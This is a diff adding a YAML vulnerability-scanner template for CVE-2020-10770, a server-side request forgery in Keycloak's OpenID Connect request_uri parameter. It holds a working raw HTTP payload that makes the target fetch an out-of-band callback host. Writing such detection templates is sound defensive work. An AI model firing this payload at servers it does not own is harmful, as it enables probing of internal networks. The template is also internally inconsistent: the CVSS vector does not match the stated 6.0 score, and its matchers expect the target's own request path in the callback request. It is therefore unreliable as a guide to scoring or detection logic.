@@ -1,0 +1,43 @@
+id: CVE-2020-10770
+info:
+  name: Keycloak 12.0.1 SSRF
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Keycloak is an open-source identity and access management system. Before Keycloak 13.0.0, the `request_uri` parameter contains an SSRF vulnerability. An attacker can exploit this to detect intranet ports or attack internal applications.
+  reference:
+    - https://www.exploit-db.com/exploits/50405
+    - https://www.keycloak.org
+  classification:
+    cve-id: CVE-2020-10770
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 6.0
+  tags: ssrf,keycloak
+
+http:
+  - raw:
+      - |
+        GET /auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+      - type: word
+        part: interactsh_request
+        words:
+          - "GET /auth/realms/master/protocol/openid-connect/auth"
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "request_uri=http://{{interactsh-url}}"
+    extractors:
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "request_uri=.*"
+        internal: true
